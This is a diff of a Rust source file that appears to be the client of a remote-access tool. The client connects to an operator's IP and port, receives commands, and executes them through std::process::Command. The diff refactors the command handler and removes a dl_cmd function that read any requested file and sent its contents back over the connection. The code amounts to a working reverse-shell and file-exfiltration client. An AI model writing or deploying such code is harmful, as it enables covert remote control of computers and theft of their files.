@@ -1,17 +1,9 @@
 use std::error::Error;
-use std::fs::File;
-use std::io::{BufRead, BufReader, Read, Write};
+use std::io::{Read, Write};
 use std::net::TcpStream;
 use std::process::{exit, Command};
 
-enum HandlerStatus {
-    Ok,
-    MetadataError,
-    FileError,
-    CmdError,
-    EndSession,
-    SendError,
-}
+use crate::utils::*;
 
 pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
     let mut stream = TcpStream::connect(i.to_owned() + ":" + p)?;
@@ -43,7 +35,6 @@ pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
 
         match handler(cmd, &mut stream) {
             HandlerStatus::Ok => (),
-            HandlerStatus::MetadataError => println!("File metadata error"),
             HandlerStatus::FileError => println!("File error"),
             HandlerStatus::CmdError => println!("Command error"),
             HandlerStatus::EndSession => {
@@ -69,29 +60,6 @@ fn handler(cmd: String, tls_stream: &mut TcpStream) -> HandlerStatus {
     } else {
         run_cmd(&cmd, tls_stream)
     }
-}
-
-fn dl_cmd(cmd: &String, tls_stream: &mut TcpStream) -> HandlerStatus {
-    let path: Vec<&str> = cmd.split(' ').collect();
-    match File::open(path[1]) {
-        Ok(mut file) => match read_file(&mut file) {
-            Ok(vec) => {
-                let status = tls_stream.write_all(&vec);
-                if status.is_err() {
-                    return HandlerStatus::SendError;
-                }
-                HandlerStatus::Ok
-            }
-            Err(_) => HandlerStatus::FileError,
-        },
-        Err(_) => HandlerStatus::FileError,
-    }
-}
-
-fn read_file(file: &mut File) -> Result<Vec<u8>, std::io::Error> {
-    let mut reader = BufReader::new(file);
-    let vec = reader.fill_buf()?.to_vec();
-    Ok(vec)
 }
 
 fn run_cmd(cmd: &String, tls_stream: &mut TcpStream) -> HandlerStatus {
